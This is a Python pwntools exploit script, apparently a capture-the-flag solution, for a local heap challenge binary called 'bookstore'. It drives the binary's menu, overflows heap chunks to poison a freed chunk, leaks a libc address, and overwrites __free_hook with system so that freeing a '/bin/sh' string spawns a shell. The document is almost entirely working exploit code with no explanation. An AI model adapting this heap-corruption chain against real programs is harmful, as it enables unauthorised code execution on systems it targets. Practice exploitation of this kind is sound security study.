#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./bookstore'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

outtosys = -0x17BBA0
systohook = 0x17B070
systoexecve = 0x83F20

def add_book(AName, blength, BName, rec = 1, sen1 = 0, sen2 = 0):
    if rec == 1:
        p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("name?")
    if sen1 ==  0:
        p.sendline(AName)
    else: 
        p.send(AName)
    p.recvuntil("name?")
    p.sendline(str(blength))
    p.recvuntil("book?")
    if sen2 == 0:
        p.sendline(BName)
    else:
        p.send(BName)
    return

def read_book(index, rec = 1):
    if rec == 1:
        p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("sell?")
    p.sendline(str(index))
    r = p.recvuntil("choice:")
    return r

def sell_book(index, rec = 1):
    if rec == 1:
        p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("sell?")
    p.sendline(str(index))
    return

def quit(rec = 1):
    if rec == 1:
        p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("Bye!")
    return

#cf1
ow1 = pwn.p64(0) + pwn.p64(0) + pwn.p64(0) 
#ow1 += pwn.p64(0xcf1)
#ow1 += pwn.p64(0x51) + 9*pwn.p64(0) + pwn.p64(0x51)
#add_book("A",0x40,"B"*0x3F,1,0,1)
#add_book("A",0x40,"B"*0x3F,1,0,1)
#add_book("A",0x40,"B"*0x3F,1,0,1)
add_book("A",0,ow1,1,0,1)
p.sendline("")
for i in range(6):
    add_book("A",0x40,"B")
add_book("A",0,"/bin/sh",1,0,1)
p.sendline("")
sell_book(0)
sell_book(1)
sen1 = 3*pwn.p64(0) + pwn.p64(0x51) + pwn.p64(0x6020d0) 
add_book("A",0,sen1,1,0,1)
p.sendline("")
add_book("A",0x40,"B")
add_book("A",0x40,pwn.p64(0x602020),1,0,1)
p.sendline("")
r = read_book(2)
r = re.search("Bookname:.*",r).group(0)[9:].ljust(8,"\x00")
la = pwn.util.packing.unpack(r, 'all', endian = 'little', signed = False)
print "[+] stdout at addr: "+hex(la)
sys = la + outtosys
print "[+] System is at: "+hex(sys)
mallochook = sys + systohook
print "[+] malloc hook addr: "+hex(mallochook)
freehook = mallochook + 0x1CB8
print "[+] free hook at: "+hex(freehook)
#add_book("A",0,ow1,0,0,1)
#p.sendline("")
#for i in range(4):
#    add_book("A",0x40,"B")
#add_book("A",0,"a",1,0,1)
#p.sendline("")
#add_book("CDC", 0x40, "/bin/sh", 0,0,1)
p.sendline("")
sell_book(0,0)
#sell_book(1)
ow2 = 3*pwn.p64(0)+pwn.p64(0x51)+9*pwn.p64(0)+pwn.p64(0x51)+pwn.p64(freehook)
add_book("A",0,ow2,1,0,1)
p.sendline("")
add_book("A",0x40, "NNN")
add_book("A",0x40, pwn.p64(sys),1,0,1)
p.sendline("")
p.recvuntil("choice:")
p.sendline("2")
p.recvuntil("sell?")
p.sendline("7")
#p.recvuntil("name?")
#p.send("10")


print "[+] Shell spawned."
p.interactive()
